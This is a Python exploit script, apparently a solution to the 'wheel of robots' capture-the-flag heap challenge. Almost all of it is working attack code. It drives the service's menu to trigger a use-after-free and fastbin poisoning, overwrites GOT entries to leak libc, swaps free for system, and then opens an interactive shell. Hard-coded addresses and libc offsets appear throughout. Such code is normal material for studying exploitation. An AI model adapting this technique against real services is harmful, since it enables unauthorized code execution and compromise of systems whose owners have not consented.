#!/usr/bin/env python3

import struct
import socket
import time
import telnetlib

main_ptr = 0x40185a
#calloc_libc = 0x84160
calloc_libc = 0x84d10
libc_sys = 0x45390

def recv_until(sock, delim):
    buf = sock.recv(1)
    while delim not in buf:
        buf += sock.recv(1)
    #print(buf)
    return buf

def skip_menu(sock):
    return recv_until(sock, b"Your choice : ")

def add_robo(sock, type, val=0):
    sock.sendall(b"1\0")
    recv_until(sock, b"want to add")
    sock.sendall(str(type).encode() + b"\0")
    if type in (2,3,6):
        recv_until(sock, b"'s")
        sock.sendall(str(val).encode() + b"\0")

def add_robo2(sock, type, val=None):
    sock.sendall(b"1\0")
    recv_until(sock, b"want to add")
    sock.sendall(type)
    if val != None:
        recv_until(sock, b"'s")
        sock.sendall(val)

def delete_robo(sock, num):
    sock.sendall(b"2\0")
    recv_until(sock, b"remove")
    sock.sendall(str(num).encode() + b"\0")

def mod_robo(sock, num, buf):
    sock.sendall(b"3\0")
    recv_until(sock, b"change")
    sock.sendall(str(num).encode() + b"\0")
    recv_until(sock, b"name: ")
    sock.sendall(buf)

def get_libc(sock):
    sock.sendall(b"4\0")
    time.sleep(0.5)
    recv_until(sock, b"#")
    buf = recv_until(sock, b"\n")
    if b"Thx" not in buf:
        return get_libc(sock)
    st = buf.index(b"Thx ") + 4
    end = buf[st:].index(b"!")
    return struct.unpack('<Q', buf[st:st + end].ljust(8, b"\0"))[0]

def pwn():
    sock = socket.socket()
    #sock.connect(("wheelofrobots.insomni.hack", 6666))
    sock.connect(("localhost", 4088))
    
    skip_menu(sock)
    #add bender
    add_robo(sock, 2, 4)
    skip_menu(sock)

    #delete bender
    delete_robo(sock, 2)
    skip_menu(sock)

    # consoledate heap
    # consoledate freed behder's heap with top
    # to keep the heap clean.
    # add & delete billionaire
    add_robo(sock,5)
    skip_menu(sock)
    delete_robo(sock, 5)
    skip_menu(sock)

    ## add timy <- ?
    print("[+] setting bender init")
    # add evil
    # the evil will be allocated at same address as the previous bender
    # overwrite bender flag so we can modify it
    add_robo2(sock, b"3\0\0\0\1", b"5")
    skip_menu(sock)
    # deleve evil
    delete_robo(sock, 3)

    skip_menu(sock)

    # bender's flag is overwritten so the name can be modified.
    # since the previous bender and evil have the same allocated address,
    # now the name of bender will be pointing to evil bot name which is already freed.
    # overwrite fastbin next ptr to so it will return
    # the address 3 bytes before the heap array.
    mod_robo(sock, 2, struct.pack('<Q', 0x6030cd))
    print("[+] modifyed list")

    skip_menu(sock)
    add_robo(sock, 3, 5)
    skip_menu(sock)

    # the next add_robo below will return the desired pointer.
    add_robo(sock, 6, 5)
    skip_menu(sock)

    # point four robot names to calloc in GOT
    # point to exit
    # pointer for persistent access to pointer array
    # don't forget to set in use flags and robot counter too
    mod_robo(sock, 6, b"sh\0" + struct.pack('<QQQQQQIIIIIIIIQ', 0x603070, 0x603070, 0x603070, 0x603098, 0x603070, 0x6030dd,0,1,1,1,1,1,1,0,3))
    skip_menu(sock)

    # change exit to main
    mod_robo(sock, 1, struct.pack('<Q', main_ptr))
    skip_menu(sock)

    #tel = telnetlib.Telnet()
    #tel.sock = sock
    #tel.interact()
    lib = get_libc(sock) - calloc_libc
    print("[+] free is at " + hex(lib))

    # use the pointer to array in 5
    # number five will point to sh
    # make a pointer pointing to free
    mod_robo(sock, 5, b"sh\0" + struct.pack('<QQQQQQ', 0x603070, 0x603070, 0x603070, 0x603018, 0x603070, 0x6030dd))
    skip_menu(sock)

    # overwrite free to system
    mod_robo(sock, 1,struct.pack('<Q', lib + libc_sys))
    skip_menu(sock)
    print("[+] Hacked")
    return sock

tel = telnetlib.Telnet()
tel.sock = pwn()
tel.interact()
